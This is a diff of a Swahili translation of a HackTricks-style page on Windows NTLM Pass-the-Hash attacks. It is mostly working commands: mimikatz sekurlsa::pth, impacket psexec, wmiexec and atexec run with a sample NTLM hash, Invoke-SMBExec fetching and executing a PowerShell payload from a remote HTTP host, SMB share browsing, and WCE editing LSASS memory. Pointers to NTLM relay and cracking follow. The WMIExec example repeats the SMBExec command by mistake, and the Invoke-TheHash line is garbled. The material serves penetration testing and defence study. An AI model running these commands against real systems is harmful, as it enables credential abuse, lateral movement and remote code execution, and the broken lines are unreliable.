+**Unapokuwa na hash ya muathiriwa**, unaweza kutumia **kujifanya** kuwa yeye.\
+Unahitaji kutumia **zana** ambayo itafanya **uthibitisho wa NTLM ukitumia** ile **hash**, **au** unaweza kuunda **sessionlogon** mpya na **kuingiza** ile **hash** ndani ya **LSASS**, hivyo wakati wowote **uthibitisho wa NTLM unafanywa**, ile **hash itatumika.** Chaguo la mwisho ndilo linalofanywa na mimikatz.
 
-**Marafiki unapokuwa na hash ya mwathirika**, unaweza kuitumia kuwa **kama yeye**.\
-Unahitaji kutumia **zana** ambayo itatekeleza **uthibitishaji wa NTLM** kwa kutumia **hash hiyo**, **au** unaweza kuunda **sessionlogon** mpya na **kuingiza** hash hiyo ndani ya **LSASS**, kwa hivyo wakati wowote **uthibitishaji wa NTLM unatekelezwa**, hash hiyo itatumika. Chaguo la mwisho ndilo linalofanywa na mimikatz.
+**Tafadhali, kumbuka unaweza kufanya mashambulizi ya Pita-Hash pia kwa kutumia akaunti za Kompyuta.**
 
-**Tafadhali, kumbuka kuwa unaweza kutekeleza mashambulizi ya Pita Hash pia kwa kutumia akaunti za Kompyuta.**
+### **Mimikatz**
 
-#### **Mimikatz**
-
-**Inahitaji kukimbia kama msimamizi**
-
+**Inahitaji kuendeshwa kama msimamizi**
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
+Hii itazindua mchakato ambao utamilikiwa na watumiaji ambao wamezindua mimikatz lakini ndani ya LSASS, sifa zilizohifadhiwa ni zile zilizo ndani ya paramita za mimikatz. Kisha, unaweza kupata ufikiaji wa rasilimali za mtandao kana kwamba wewe ni mtumiaji huyo (kama `runas /netonly` lakini hauitaji kujua nenosiri la maandishi wazi).
 
-Hii itazindua mchakato ambao utamilikiwa na watumiaji ambao wamezindua mimikatz lakini ndani ya LSASS, nywila zilizohifadhiwa ni zile zilizo ndani ya vigezo vya mimikatz. Kisha, unaweza kupata rasilimali za mtandao kana kwamba wewe ni mtumiaji huyo (sawa na mbinu ya `runas /netonly` lakini hauitaji kujua nywila ya maandishi wazi).
+### Pass-the-Hash kutoka linux
 
-#### Pass-the-Hash kutoka kwenye linux
+Unaweza kupata utekelezaji wa nambari kwenye mashine za Windows ukitumia Pass-the-Hash kutoka Linux.\
+[**Pata hapa kujifunza jinsi ya kufanya hivyo.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)
 
-Unaweza kupata utekelezaji wa nambari kwenye mashine za Windows ukitumia Pass-the-Hash kutoka kwenye Linux.\
-[**Bofya hapa kujifunza jinsi ya kufanya hivyo.**](https://github.com/carlospolop/hacktricks/blob/sw/windows/ntlm/broken-reference/README.md)
+### Zana zilizokompiliwa za Impacket kwa Windows
 
-#### Zana zilizopangwa za Impacket Windows
-
-Unaweza kupakua [zana za impacket kwa Windows hapa](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).
+Unaweza kupakua [binari za impacket kwa Windows hapa](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).
 
 * **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 * **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
-* **atexec.exe** (Katika kesi hii unahitaji kutoa amri, cmd.exe na powershell.exe sio halali kupata kabati la kuingiliana)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-* Kuna zana zingine za Impacket...
+* **atexec.exe** (Katika kesi hii unahitaji kutaja amri, cmd.exe na powershell.exe sio halali kupata kabati la mwingiliano)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
+* Kuna binari zingine za Impacket zaidi...
 
-#### Invoke-TheHash
+### Kuita-TheHash
 
-Unaweza kupata hati za powershell hapa: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
+Unaweza kupata skripti za powershell hapa: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
 
-**Invoke-SMBExec**
-
+#### Kuita-SMBExec
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-
-**Kuita-WMIExec**
-
-`Invoke-WMIExec` ni skripti ya PowerShell ambayo inatumika kutekeleza amri kwenye mfumo wa mbali kupitia WMI (Windows Management Instrumentation). Skripti hii inaruhusu mtumiaji kutekeleza amri za PowerShell kwenye mfumo wa lengo bila kuhitaji uwepo wa seva ya SMB.
-
-**Matumizi**
-
-```plaintext
-Invoke-WMIExec -Target <target> [-Username <username>] [-Password <password>] [-Command <command>] [-Verbose]
-```
-
-**Vigezo**
-
-* `-Target`: Anwani ya IP au jina la uwanja la mfumo wa lengo.
-* `-Username`: Jina la mtumiaji wa akaunti ya kuingia kwenye mfumo wa lengo (hiari).
-* `-Password`: Nenosiri la akaunti ya kuingia kwenye mfumo wa lengo (hiari).
-* `-Command`: Amri ya PowerShell ya kutekelezwa kwenye mfumo wa lengo (hiari).
-* `-Verbose`: Onyesha maelezo zaidi wakati wa utekelezaji (hiari).
-
-**Maelezo**
-
-`Invoke-WMIExec` inatumia WMI kuanzisha uhusiano na mfumo wa lengo na kutekeleza amri za PowerShell kwa kutumia `Win32_Process` na `Create` method. Skripti hii inaweza kutumika kwa ufanisi katika mazingira ambapo seva ya SMB imezimwa au haipatikani.
-
-**Vidokezo**
-
-* Ili kutumia `Invoke-WMIExec`, unahitaji kuwa na idhini ya kuingia kwenye mfumo wa lengo.
-* Kama jina la mtumiaji na nenosiri havijatolewa, skripti itatumia maelezo ya kuingia ya mtumiaji wa sasa.
-* Ikiwa amri haijatolewa, skripti itatekeleza amri ya msingi ya `whoami` kwenye mfumo wa lengo.
-* Kwa matokeo bora, hakikisha kuwa mfumo wa lengo una mazingira sahihi ya WMI na idhini zinazofaa.
-
+#### Kuita-WMIExec
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-
-**Kuita-SMBClient**
-
-`Invoke-SMBClient` ni kipengele cha PowerShell kinachotumiwa kuingia kwenye mfumo wa SMB (Server Message Block) na kutekeleza operesheni mbalimbali kama vile kusoma, kuandika, na kufuta faili. Kwa kutumia kipengele hiki, unaweza kufanya uchunguzi wa kina wa mifumo ya SMB na kuchunguza udhaifu wowote uliopo.
-
-Kipengele hiki kinaweza kutumiwa kwa njia mbalimbali, kama vile kuingia kwenye mfumo wa SMB kwa kutumia jina la mtumiaji na nenosiri, kuingia kwa kutumia cheti cha kuingilia, au hata kuingia kwa kutumia kitambulisho cha NTLM (New Technology LAN Manager).
-
-Kwa kuita `Invoke-SMBClient`, unaweza kufanya uchunguzi wa mifumo ya SMB na kuchunguza udhaifu wowote uliopo. Kumbuka kuwa matumizi ya kipengele hiki yanapaswa kufanywa kwa njia halali na kwa idhini ya mmiliki wa mfumo husika.
-
+#### Kuita-SMBClient
 ```bash
 Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
 ```
-
-**Kuita-SMBEnum**
-
-`Invoke-SMBEnum` ni skripti ya PowerShell ambayo inatumika kuchunguza na kuchambua mazingira ya SMB (Server Message Block) kwenye mfumo wa Windows. Skripti hii inatoa habari muhimu kuhusu mazingira ya SMB, kama vile orodha ya watumiaji, orodha ya kikundi, na maelezo mengine ya kifaa.
-
-Skripti hii inaweza kutumiwa kama zana ya uchunguzi wa usalama au kwa madhumuni ya uchunguzi wa ndani. Inatoa ufikiaji wa habari muhimu ambazo zinaweza kutumiwa kwa uchambuzi wa hatari au kuboresha usalama wa mazingira ya SMB.
-
-Kwa kuita `Invoke-SMBEnum`, unaweza kupata habari muhimu kuhusu mazingira ya SMB na kuchambua hatari za usalama ambazo zinaweza kuwepo. Skripti hii inaweza kuwa na manufaa kwa wataalamu wa usalama, wataalamu wa uchunguzi wa ndani, au wale wanaofanya upimaji wa usalama.
-
+#### Kuita-SMBEnum
 ```bash
 Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
 ```
+#### Kuita-Hash
 
-**Kuita-TheHash**
-
-Kazi hii ni **mchanganyiko wa zingine zote**. Unaweza kuwasilisha **watumishi kadhaa**, **kutoa kipaumbele** kwa wengine na **kuchagua** **chaguo** unayotaka kutumia (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ikiwa unachagua **yoyote** kati ya **SMBExec** na **WMIExec** lakini **hutoi** kipengele cha _**Amri**_, itaangalia tu ikiwa una **mamlaka ya kutosha**.
-
+Hii ni **mchanganyiko wa zingine zote**. Unaweza kupitisha **wenyeji kadhaa**, **kutoa** wengine na **kuchagua** **chaguo** unalotaka kutumia (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ikiwa unachagua **yoyote** ya **SMBExec** na **WMIExec** lakini haujatoa **parameta ya Amri** itaangalia tu ikiwa una **idhini za kutosha**.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
+### [Evil-WinRM Pita Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
 
-#### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
+### Mhariri wa Sifa za Windows (WCE)
 
-#### Mhariri wa Vitambulisho vya Windows (WCE)
+**Inahitaji kuendeshwa kama msimamizi**
 
-**Inahitaji kukimbia kama msimamizi**
-
-Zana hii itafanya kitu kimoja na mimikatz (kurekebisha kumbukumbu ya LSASS).
-
+Chombo hiki kitafanya kitu sawa na mimikatz (kurekebisha kumbukumbu ya LSASS).
 ```
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
-
-#### Utekelezaji wa mbali wa Windows kwa kutumia jina la mtumiaji na nenosiri
+### Utekelezaji wa mbali wa Windows kwa kutumia jina la mtumiaji na nenosiri
 
 {% content-ref url="../lateral-movement/" %}
 [lateral-movement](../lateral-movement/)
 {% endcontent-ref %}
 
-### Kupata siri kutoka kwenye Kifaa cha Windows
+## Kuchimbua siri kutoka kwa Mwenyeji wa Windows
 
-**Kwa maelezo zaidi kuhusu** [**jinsi ya kupata siri kutoka kwenye kifaa cha Windows unapaswa kusoma ukurasa huu**](https://github.com/carlospolop/hacktricks/blob/sw/windows-hardening/ntlm/broken-reference/README.md)**.**
+**Kwa maelezo zaidi kuhusu** [**jinsi ya kupata siri kutoka kwa mwenyeji wa Windows unapaswa kusoma ukurasa huu**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**
 
-### NTLM Relay na Responder
+## NTLM Relay na Responder
 
-**Soma mwongozo maelezo zaidi kuhusu jinsi ya kufanya mashambulizi haya hapa:**
+**Soma mwongozo kamili zaidi kuhusu jinsi ya kufanya mashambulizi hayo hapa:**
 
 {% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
 [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
 {% endcontent-ref %}
 
-### Kuchambua changamoto za NTLM kutoka kwenye kifaa cha mtandao
+## Kupasua changamoto za NTLM kutoka kwa kufuatilia mtandao
 
 **Unaweza kutumia** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
-
-<details>
-
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**]\(https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
-
-</details>
